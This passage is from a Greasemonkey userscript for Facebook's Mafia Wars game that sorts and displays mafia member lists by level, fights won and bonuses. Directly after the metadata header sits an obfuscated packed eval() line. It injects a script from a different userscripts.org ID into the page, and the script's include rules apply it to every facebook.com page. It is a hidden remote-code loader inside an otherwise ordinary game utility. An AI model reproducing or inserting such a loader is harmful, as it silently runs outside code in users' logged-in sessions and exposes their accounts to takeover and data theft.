// ==UserScript==
// @name          Face Book Mafia Wars Alphabetic Member List Plus
// @description   Sorts and display the members list in Mafia Wars.  Some utilities came from the Facebook Mafia Wars News Feed Processor RELOADED script http://userscripts.org/scripts/show/59850
// @namespace     MafiaWars
// @include       http://apps.facebook.com/inthemafia/*
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// @include       http://apps.new.facebook.com/inthemafia/*
// @include       http://facebook.mafiawars.com/mwfb/*
// @version       0.3.23
// @contributor   Shrubber
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


// Variables for Event trigger
var pass = 0,
    change_count = 0,
    notify_count = 0,
    scheduled = false,
    bDebugOn = false;

var strMyMafia              = '//div[contains(text(),"Your Mafia Members")]',
    strMyMafiaBox           = '//div[@class="tab_box topmafia_box"]',
    strMyMafiaPage          = '//div[contains(text(),"Page:")]',
    strMyMafiaPageNumbers   = '//div[contains(text(),"Page:")]/a',
    strMyMafiaMembers       = '//div[contains(@style,"border-top:")]',
    strMyMafiaMembersLoad   = '//div[contains(@style,"float: left; width: 55px")]',
    strMyMafiaInsert        = '//div[contains(@style,"margin-top: 15px; float:")]',
    strMyMafiaNameLevel     = '//div[contains(@style,"float: left; width: 135px")]',
    strMyMafiaType          = '//div[contains(@style,"float: left; width: 55px; text-align: center; font-weight: bold;")]',
    strMyMafiaStats         = '//div[contains(@style,"float: left; width: 100px; text-align: center; font-weight: bold;")]',
    strMafiaPage            = 'http://facebook.mafiawars.com/mwfb/remote/html_server.php?xw_controller=group&xw_action=view&xw_city=3&skip_req_frame=1&xw_client_id=8&p=',
    strMafiaSize            = 'app10979261223_user_group_size',
    strLeaderBoard          = '//div[contains(text(),"My Mafia Leaderboards only contain mafia members")]',
    strMyMafiaFix           = '//div[contains(text(),"We apologize for the inconvenience we are currently working to fix this page.")]',
    strFreeGifts      		  = '//a[contains(text(),"Player Updates")]',
    strTopFamilies          = '//a[contains(text(),"Top Families")]',
    strTopMafiaBox          = '//div[contains(@class,"topmafia_box")]',
    strCityWrapper      	  = '//div[@id="mw_city_wrapper"]';


// Anchor Name for Script created elements
var strAlphaToolbar         = 'MMALAlphaTBar',
    strAlphaTbar      		= 'MMALAlphaTBarDivOther',
    strAlphaTbarLV       	= 'MMALAlphaTBarDivLV',
    strAlphaTables          = 'MMALAlphaTable',
    strLeaderBoardToolbar   = 'MMALLeaderBoardTBar',
    strLeaderBoardTables    = 'MMALLeaderBoardTable',
    strTopFamilyToolbar     = 'MMALTopFamilyTBar',
    strTopMafiaToolbar      = 'MMALLeaderBoardTBar',
    strTopMafiaTables       = 'MMALLeaderBoardTable',

    strStatus               = 'MMALStatus',
    strSortBy               = 'MMALSortBy',
    strCurrentJob           = 'MMALJob';

// Script Specific Variables
var iMafiaMemberCount = 0,
    iCount = 0,
    iPageCount = 1,
    iErrorCount = 0,
    aMafiaMembers           = new Array(),
    aAlphaDisplayTable      = new Array(),
    aTopMafiaDisplayTable   = new Array(),
    aTopMafiaSortDirection  = new Array(),
    aTopBonusDisplayTable   = new Array(),
    bInitialized = false,
    iDataTimeStamp = 0,
    iAlphaSortBy=0,
    local_xw_sig = 0,
    FB_user_id = 0,
    strCityCode = '',
    bTopFrame     = false,
    xmlhttp                 = new XMLHttpRequest();

// Pointers to Utilities
var g_DOMUtils = new DOMUtils(),
    g_Utils = new Utilities(),
    g_ListenerLib = new ListenerLib();

// Event Timers
var bDataBeingUpdated = false,
    bLoadingData = false,
    bSaveData = false,
    strDataSaveSet,
    bDataSaved = false;

var iLoadEvent = 0,
    iProcessEvent = 0,
    iSaveTableEvent = 0,
    iWatchDog = 0;

var iMafiaSize,
    strFrameId;

// Logo

var imgArrow = new Array();

    imgArrow[0] = 'data:image/gif;base64,'+
         'R0lGODlhEAAQAHAAACH5BAEAACAALAAAAAAQABAAhQAAADApByEcBR4aBZiBF4BtFBIPAx8aBZmC'+
         'F//ZJ/jTJoFuFBMQA5qDGP3XJ/LOJRwYBJ2GGPXQJR0ZBKCIGBkVBPzWJ/7YJ/TQJX1qEwoJAmhZ'+
         'ENCxIMyuH8CjHVRHDQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'+
         'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAY9QJBw'+
         'SCwaj8ikMgBRDg2RhcYJiSQSBUMSek0oskcDpXtVZLREyJjclT7XZW85AxBuOJ28ft/5OP+AgYKD'+
         'QQA7';

    imgArrow[1] = 'data:image/gif;base64,'+
         'R0lGODlhEAAQAMQfABIPA//ZJ8yuH/zWJxMQA4BtFB4aBYFuFP3XJ52GGB0ZBBwYBH1qExkVBPjT'+
         'JvTQJaCIGB8aBfLOJQoJAlRHDWhZEMCjHf7YJyEcBZqDGNCxIDApB/XQJZmCF5iBFwAAACH5BAEA'+
         'AB8ALAAAAAAQABAAAAVB4CeOZGmeaKqu7EhZmiDPs1aJE/NcQ+8jgURjBDg4AshkAKIoEQocZXBx'+
         'ekqQiIwhRTAGOpEVoODZsjCblnrdCgEAOw==';

var imgABC = 'data:image/jpg;base64,'+
         '/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAIBAQIBAQICAgICAgICAwUDAwMDAwYEBAMFBwYHBwcG'+
         'BwcICQsJCAgKCAcHCg0KCgsMDAwMBwkODw0MDgsMDAz/2wBDAQICAgMDAwYDAwYMCAcIDAwMDAwM'+
         'DAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAz/wAARCAAyAC4DASIA'+
         'AhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQA'+
         'AAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3'+
         'ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWm'+
         'p6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEA'+
         'AwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSEx'+
         'BhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElK'+
         'U1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3'+
         'uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwD4O/4J'+
         'v/8ABPHwb48/Z60Hxr4k8R+HLfxl8QNQu7fw1pWtaP8Ab9OltbVmifzpGcLbl5kkDTeTOsKpEzmB'+
         'ZCzfM/x++G1v4xTWrzTPCS+EPGPhLWP7F8ReG7aMqFd5TFDJDF1B8xTGyLnDFT/EK/Q//gn/AGSa'+
         'd4Q+AS28cVrHD8LNdnjzCsu+W71GaKY4fKncqHggjrxXjfi/xY/jTxV8If2n/C5hs77xgV8OeMIk'+
         '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'+
         'SyEs5wAMkk8UUUAf/9k=';

var vals = new Array();

function Initialize() {

    var i;
    g_Utils.doLog('Intialize', bDebugOn, 'Working in Frame only '+ bTopFrame);
    
    // Force a Manual Reload of the Data
    bReLoad = GM_getValue('ForceReload',false);
    GM_setValue('ForceReload', bReLoad);
    
    // Disable the Automatic loading of Data
    bAutoDisable = GM_getValue('bAutoDisable',false);
    GM_setValue('bAutoDisable',bAutoDisable );

    // Sort Method
    iAlphaSortBy = GM_getValue('iAlphaSortBy',0);
    GM_setValue('iAlphaSortBy',iAlphaSortBy);
                
    // Debug Mode
    //bDebugOn = GM_getValue('bDebugOn',false);
    bDebugOn = true;
    GM_setValue('bDebugOn',bDebugOn);

    //Case Specific Initialization
    if (strFrameId == 'MafiaWars') {
            g_Utils.doLog('Intialize', bDebugOn, 'Init Values');

        // get the FB User ID
        oDom = document.evaluate('//script[contains(text(),"sf_xw_user_id\'")]', document, null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);
        if (oDom.snapshotLength>0) {

            strTemp   = oDom.snapshotItem(0).textContent;
            iStart    = strTemp.indexOf("'sf_xw_user_id': '")+18;
            iEnd    = strTemp.indexOf("'",iStart);
            FB_user_id    = strTemp.slice(iStart, iEnd)+'';
            g_Utils.doLog('Intialize', bDebugOn, 'FB_user_id = '+ FB_user_id);
            GM_setValue('FB_user_id',FB_user_id);
        };

        // Initialize the Data Save options

        // Does a Save data set exist
        bDataSaved = GM_getValue(FB_user_id+'-bDataSaved', false);
        GM_setValue(FB_user_id+'-bDataSaved',bDataSaved);

        // Time of last successful Data Save
        iDataTimeStamp = GM_getValue(FB_user_id+'-iDataTimeStamp',0);
        GM_setValue(FB_user_id+'-iDataTimeStamp',iDataTimeStamp);

        // Whuch Save set was used (A or B)
        strDataSaveSet = GM_getValue(FB_user_id+'-strDataSaveSet', 'A');
        GM_setValue(FB_user_id+'-strDataSaveSet',strDataSaveSet);

        // Mafia member count
        iMafiaMemberCount = GM_getValue(FB_user_id+'-iMafiaMemberCount',0);
        GM_setValue(FB_user_id+'-iMafiaMemberCount',iMafiaMemberCount);

        // Get the top Mafia Sort Directions
        for(i = 0; i<5; i++) {
            aTopMafiaSortDirection[i] = GM_getValue(FB_user_id+'-aTopMafiaSortDirection['+i+']',1);
            GM_setValue(FB_user_id+'-aTopMafiaSortDirection['+i+']',aTopMafiaSortDirection[i]);
        }


        // Should I do a data save after the next processdata run?
        bSaveData= false;

        //clean up old data
        for (i=0; i<12; i++) {
            GM_deleteValue('MememberSet-A['+i+']');
            GM_deleteValue('MememberSet-B['+i+']');
        }
        GM_deleteValue('bDataSaved');
        GM_deleteValue('iDataTimeStamp');
        GM_deleteValue('iMafiaMemberCount');
        GM_deleteValue('strDataSaveSet');

        // Set up Display Arrays

        // Alphabetic Display
        for ( i = 0; i<14; i++) {
            aAlphaDisplayTable[i]       = new Array();
            aAlphaDisplayTable[i][0]    = '';
            aAlphaDisplayTable[i][1]    = document.createElement('table');
            aAlphaDisplayTable[i][1].setAttribute('style', 'float: left;');
            aAlphaDisplayTable[i][1].innerHTML = '<tr>Script Inializing.  Checking for Saved Data.</tr>';
            aAlphaDisplayTable[i][1].firstChild.setAttribute('style', 'border: 1px solid rgb(170, 170, 170); overflow: auto; height: 276px; width: 744px; float: left;');
        }

        // Top Mafia Display
        for ( i = 0;i<5; i++) {
            aTopMafiaDisplayTable[i]       = new Array();
            aTopMafiaDisplayTable[i][0]    = document.createElement('table');
            aTopMafiaDisplayTable[i][0].innerHTML = '<tr>Script Inializing.  Checking for Saved Data.</tr>';
            aTopMafiaDisplayTable[i][0].firstChild.setAttribute('style', 'border: 1px solid rgb(170, 170, 170); overflow: auto; height: 276px; width: 732px; float: left;');
            aTopMafiaDisplayTable[i][1]    = document.createElement('table');
            aTopMafiaDisplayTable[i][1].innerHTML = '<tr>Script Inializing.  Checking for Saved Data.</tr>';
            aTopMafiaDisplayTable[i][1].firstChild.setAttribute('style', 'border: 1px solid rgb(170, 170, 170); overflow: auto; height: 276px; width: 732px; float: left;');

        }

        // Top Mafia Display
        for ( i = 0;i<6; i++) {
            aTopBonusDisplayTable[i]    = document.createElement('table');
            aTopBonusDisplayTable[i].innerHTML = '<tr>Script Inializing.  Checking for Saved Data.</tr>';
            aTopBonusDisplayTable[i].firstChild.setAttribute('style', 'border: 1px solid rgb(170, 170, 170); overflow: auto; height: 276px; width: 732px; float: left;');
        }

        // Load the aAlphaDisplayTable array using saved members, or default message
        g_Utils.doLog('Intialize', bDebugOn, 'Loading the Alpha Tables');

        bDataBeingUpdated = true;
        bSaveData = false;
        iCount = 0;

        iLoadEvent = setTimeout(function (e) {
            LoadAlphaTables(0);
        },
        g_Utils.getRandRange(200, 300));

    } 
 
    if (bTopFrame) {

        // set up any side bars button, windows, etc

        // register GM menu commands

        GM_registerMenuCommand('FB MWars Members List - Debug On/Off', g_ListenerLib.menu_Debug);
        GM_registerMenuCommand('FB MWars Members List - Auto Load On/Off', g_ListenerLib.menu_AutoLoad);
    }
}


function LoadAlphaTables(iupdate) {
    var i, iStart, iHoldEvent, strTemp, oDom;

    iHoldEvent = iLoadEvent;
    oDom = document.createElement('div');

    if (iupdate == 0) {
        aMafiaMembers.length = 0;
    }

    if (bDataSaved) {
        g_Utils.doLog('LoadAlphaTables', bDebugOn, 'Loading Data: Table '+iupdate+' of 11');
        DisplayStatus('Loading Data: Table '+iupdate+' of 11');

        strTemp = GM_getValue(FB_user_id+'-MememberSet-'+strDataSaveSet+'['+iupdate + ']');

        aAlphaDisplayTable[iupdate][0] = strTemp;

        // only process the none blank lines
        if (strTemp != '<tr></tr>') {

            aTemp = strTemp.split('</tr>');
            for (i=0;i<(aTemp.length-1);i++) {

                iStart  = aTemp[i].indexOf("<div");

                oDom.innerHTML = aTemp[i].slice(iStart);

                // create array to store each members data
                aMafiaMembers[iCount] = new Array();
                // fill array
                aMafiaMembers[iCount][0]    = oDom.innerHTML
                aMafiaMembers[iCount][1]    = g_Utils.getMafiaMemberFBName(oDom);
                aMafiaMembers[iCount][2]    = g_Utils.getMafiaMemberMWName(oDom);
                aMafiaMembers[iCount][3]    = g_Utils.getMafiaMemberType(oDom);
                aMafiaMembers[iCount][4]    = g_Utils.getMafiaMemberLevel(oDom);
                aMafiaMembers[iCount][5]    = g_Utils.getMafiaMemberFightswon(oDom);
                aMafiaMembers[iCount][6]    = g_Utils.getMafiaMemberSussfulheists(oDom);
                aMafiaMembers[iCount][7]    = g_Utils.getMafiaMemberjobscompleted(oDom);
                iCount++;
            }
        }

        if (iupdate < 11) {
            iLoadEvent = setTimeout(function (e) {
                LoadAlphaTables(iupdate + 1);
            },
            750)
            // Cancel the Timed Event if the user has left Mafia Wars
           if (iLoadEvent <iHoldEvent ) clearTimeout(iLoadEvent );
        } else {

            g_Utils.doLog('LoadAlphaTables', bDebugOn, 'Done Loading Data');
            iProcessEvent = setTimeout(function (e) {
                ProcessData(0);
            },
            750)
            // Cancel the Timed Event if the user has left Mafia Wars
            if (iProcessEvent <iHoldEvent ) clearTimeout(iProcessEvent);

        }

    } else {
        g_Utils.doLog('LoadAlphaTables', bDebugOn, 'Loading Default Messages');
        DisplayStatus('Loading Default Messages');
        iMafiaMemberCount = 0;

        for ( i = 0; i<14; i++) {
            aAlphaDisplayTable[i]       = new Array();
            aAlphaDisplayTable[i][0]    = '';
            aAlphaDisplayTable[i][1]    = document.createElement('table');
            aAlphaDisplayTable[i][1].setAttribute('style', 'float: left;');
            aAlphaDisplayTable[i][1].innerHTML = '<tr><td>No saved data exists.  Please wait for the Auto load to complete, or manually load the data.</td></tr>';
            aAlphaDisplayTable[i][1].firstChild.setAttribute('style', 'border: 1px solid rgb(170, 170, 170); overflow: auto; height: 276px; width: 744px; float: left;');
        }

        // Top Mafia Display
        for ( i = 0;i<5; i++) {
            aTopMafiaDisplayTable[i][0]    = document.createElement('table');
            aTopMafiaDisplayTable[i][0].innerHTML = '<tr><td>No saved data exists.  Please wait for the Auto load to complete, or manually load the data.</td></tr>';
            aTopMafiaDisplayTable[i][0].firstChild.setAttribute('style', 'border: 1px solid rgb(170, 170, 170); overflow: auto; height: 276px; width: 732px; float: left;');
            aTopMafiaDisplayTable[i][1]    = document.createElement('table');
            aTopMafiaDisplayTable[i][1].innerHTML = '<tr><td>No saved data exists.  Please wait for the Auto load to complete, or manually load the data.</td></tr>';
            aTopMafiaDisplayTable[i][1].firstChild.setAttribute('style', 'border: 1px solid rgb(170, 170, 170); overflow: auto; height: 276px; width: 732px; float: left;');

        }

        // Top Mafia Display
        for ( i = 0;i<6; i++) {
            aTopBonusDisplayTable[i]    = document.createElement('table');
            aTopBonusDisplayTable[i].innerHTML = '<tr><td>No saved data exists.  Please wait for the Auto load to complete, or manually load the data.</td></tr>';
            aTopBonusDisplayTable[i].firstChild.setAttribute('style', 'border: 1px solid rgb(170, 170, 170); overflow: auto; height: 276px; width: 732px; float: left;');
        }
        bDataBeingUpdated = false;

    }
}


function SaveAlphaTables(iupdate) {
    var iHoldEvent = iSaveTableEvent,
        strTemp, strTempSaveSet,
        aTemp = new Array();


    // Whuch Save set was used (A or B)
    strDataSaveSet= GM_getValue(FB_user_id+'-strDataSaveSet');

    if (bDataSaved) {
        if (strDataSaveSet=='A')
            strTempSaveSet = 'B'
        else
            strTempSaveSet = 'A';
    } else {
        strTempSaveSet = 'A';
    }

    // save table
    g_Utils.doLog('SaveAlphaTables', bDebugOn, 'Saving Data: Table '+iupdate+' of 11');
    DisplayStatus('Saving Data: Table '+iupdate+' of 11');

    strTemp = aAlphaDisplayTable[iupdate][0];

    GM_setValue(FB_user_id+'-MememberSet-'+strTempSaveSet+'['+iupdate + ']', strTemp);

    // save next table, or finish
    if (iupdate < 11) {
        iSaveTableEvent = setTimeout(function (e) {
            SaveAlphaTables(iupdate + 1);
        },
        g_Utils.getRandRange(1000, 1500));
        // Cancel the Timed Event if the user has left Mafia Wars
        if (iSaveTableEvent<iHoldEvent ) clearTimeout(iSaveTableEvent);
    } else {

        // Update the Mafia Member Count
        iMafiaMemberCount = iCount;

        // save end information
        g_Utils.doLog('SaveAlphaTables', bDebugOn, 'Tables Saved.');

        GM_setValue(FB_user_id+'-iMafiaMemberCount', iMafiaMemberCount);
        iDataTimeStamp = g_Utils.getCurrentTime();
        GM_setValue(FB_user_id+'-iDataTimeStamp', iDataTimeStamp);
        strDataSaveSet = strTempSaveSet;
        GM_setValue(FB_user_id+'-strDataSaveSet',strDataSaveSet)
        bDataSaved = true;
        GM_setValue(FB_user_id+'-bDataSaved', bDataSaved);
        GM_setValue('ForceReload',false);

        // Indicate that another update can now occur.
        bDataBeingUpdated = false;
    }
}

function ProcessData(iUpdate) {
    var i, j, ibonus, itemp, iMaxTopMafia, iHoldEvent;
    var strTemp;
    var aTemp = new Array();

    iHoldEvent = iProcessEvent;
    g_Utils.doLog('ProcessData', bDebugOn, 'Processing Data: '+iUpdate+' of 16');
    DisplayStatus('Processing Data: '+iUpdate+' of 16');

    strTemp = '';
    iMaxTopMafia = Math.min(250,aMafiaMembers.length);

    switch (iUpdate) {

        case 0:
            // by Level
            g_Utils.doLog('ProcessData', bDebugOn, 'Sorting by Level');

            g_Utils.MergeSort(4 , 0); 
            //Top Mafia Down
            strTemp = '';
            for (i = 0; i<iMaxTopMafia ; i++) {
                 strTemp = strTemp + '<tr bgcolor="black" onmouseout="this.bgColor=\'black\';" onmouseover="this.bgColor=\'grey\';"><td>' + aMafiaMembers[i][0] + '</td></tr>';
            }
            aTopMafiaDisplayTable[0][0].innerHTML = strTemp;
            aTopMafiaDisplayTable[0][0].firstChild.setAttribute('style', 'border: 1px solid rgb(170, 170, 170); overflow: auto; height: 276px; width: 744px; float: left;');

            // Wheelman
            g_Utils.doLog('ProcessData', bDebugOn, 'Looking for Wheelman');

            g_Utils.MergeSort(4 , 1); 

            //Top Mafia Up
            strTemp = '';
            for (i = 0; i<iMaxTopMafia ; i++) {
                 strTemp = strTemp + '<tr bgcolor="black" onmouseout="this.bgColor=\'black\';" onmouseover="this.bgColor=\'grey\';"><td>' + aMafiaMembers[i][0] + '</td></tr>';
            }
            aTopMafiaDisplayTable[0][1].innerHTML = strTemp;
            aTopMafiaDisplayTable[0][1].firstChild.setAttribute('style', 'border: 1px solid rgb(170, 170, 170); overflow: auto; height: 276px; width: 744px; float: left;');

            // Wheelman
            g_Utils.doLog('ProcessData', bDebugOn, 'Looking for Wheelman');

            strTemp = '';
            i=0;
            j=0;
            ibonus=0;
            itemp=0;

            while (j<iMaxTopMafia) {
                if (aMafiaMembers[i][3] == 'Fearless') {
                    itemp = g_Utils.getWheelmanBonus(aMafiaMembers[i][4]);
                    if (ibonus != itemp) {
                        ibonus = itemp;
                        strTemp = strTemp + '<tr bgcolor="green"><td><b>'+ibonus+'% reduction on energy required for job</b></td></tr>';
                    }
                    strTemp = strTemp + '<tr bgcolor="black" onmouseout="this.bgColor=\'black\';" onmouseover="this.bgColor=\'grey\';"><td>' + aMafiaMembers[i][0] + '</td></tr>';
                    j = j + 1;
                }
                i = i + 1 ;
                if (i==aMafiaMembers.length) {
                    j = iMaxTopMafia;
                }
            }
            aTopBonusDisplayTable[1].innerHTML = strTemp;
            aTopBonusDisplayTable[1].firstChild.setAttribute('style', 'border: 1px solid rgb(170, 170, 170); overflow: auto; height: 276px; width: 744px; float: left;');


            // Buttonman
            g_Utils.doLog('ProcessData', bDebugOn, 'Looking for Buttonman');
            strTemp = '';
            i=0;
            j=0;
            ibonus=0;
            itemp=0;

            while (j<iMaxTopMafia) {
                if (aMafiaMembers[i][3] == 'Maniac') {
                    itemp = g_Utils.getButtonmanBonus(aMafiaMembers[i][4]);
                    if (ibonus != itemp) {
                        ibonus = itemp;
                        strTemp = strTemp + '<tr bgcolor="green"><td><b>'+ibonus+'% attack bonus</b></td></tr>';
                    }

                    strTemp = strTemp + '<tr bgcolor="black" onmouseout="this.bgColor=\'black\';" onmouseover="this.bgColor=\'grey\';"><td>' + aMafiaMembers[i][0] + '</td></tr>';
                    j = j + 1;
                }
                i = i + 1 ;
                if (i==aMafiaMembers.length) {
                    j = iMaxTopMafia;
                }
            }
            aTopBonusDisplayTable[2].innerHTML = strTemp;
            aTopBonusDisplayTable[2].firstChild.setAttribute('style', 'border: 1px solid rgb(170, 170, 170); overflow: auto; height: 276px; width: 744px; float: left;');


            // Bagman
            g_Utils.doLog('ProcessData', bDebugOn, 'Looking for Bagman');

            strTemp = '';
            i=0;
            j=0;
            ibonus=0;
            itemp=0;

            while (j<iMaxTopMafia) {
                if (aMafiaMembers[i][3] == 'Mogul') {
                    itemp = g_Utils.getBagmanBonus(aMafiaMembers[i][4]);
                    if (ibonus != itemp) {
                        ibonus = itemp;
                        strTemp = strTemp + '<tr bgcolor="green"><td><b>'+ibonus+'% more money from jobs</b></td></tr>';
                    }
                    strTemp = strTemp + '<tr bgcolor="black" onmouseout="this.bgColor=\'black\';" onmouseover="this.bgColor=\'grey\';"><td>' + aMafiaMembers[i][0] + '</td></tr>';
                    j = j + 1;
                }
                i = i + 1 ;
                if (i==aMafiaMembers.length) {
                    j = iMaxTopMafia;
                }
            }
            aTopBonusDisplayTable[5].innerHTML = strTemp;
            aTopBonusDisplayTable[5].firstChild.setAttribute('style', 'border: 1px solid rgb(170, 170, 170); overflow: auto; height: 276px; width: 744px; float: left;');

            break;

        case 1:
            // by Fights Won
            g_Utils.doLog('ProcessData', bDebugOn, 'Sorting by Fights Won');

            g_Utils.MergeSort(5 , 0);

            //Top Mafia
            strTemp = '';
            for (i = 0; i<iMaxTopMafia ; i++)
                strTemp = strTemp + '<tr bgcolor="black" onmouseout="this.bgColor=\'black\';" onmouseover="this.bgColor=\'grey\';"><td>' + aMafiaMembers[i][0] + '</td></tr>';
            aTopMafiaDisplayTable[1][0].innerHTML = strTemp;
            aTopMafiaDisplayTable[1][0].firstChild.setAttribute('style', 'border: 1px solid rgb(170, 170, 170); overflow: auto; height: 276px; width: 744px; float: left;');

            g_Utils.MergeSort(5 , 1);

            //Top Mafia
            strTemp = '';
            for (i = 0; i<iMaxTopMafia ; i++)
                strTemp = strTemp + '<tr bgcolor="black" onmouseout="this.bgColor=\'black\';" onmouseover="this.bgColor=\'grey\';"><td>' + aMafiaMembers[i][0] + '</td></tr>';
            aTopMafiaDisplayTable[1][1].innerHTML = strTemp;
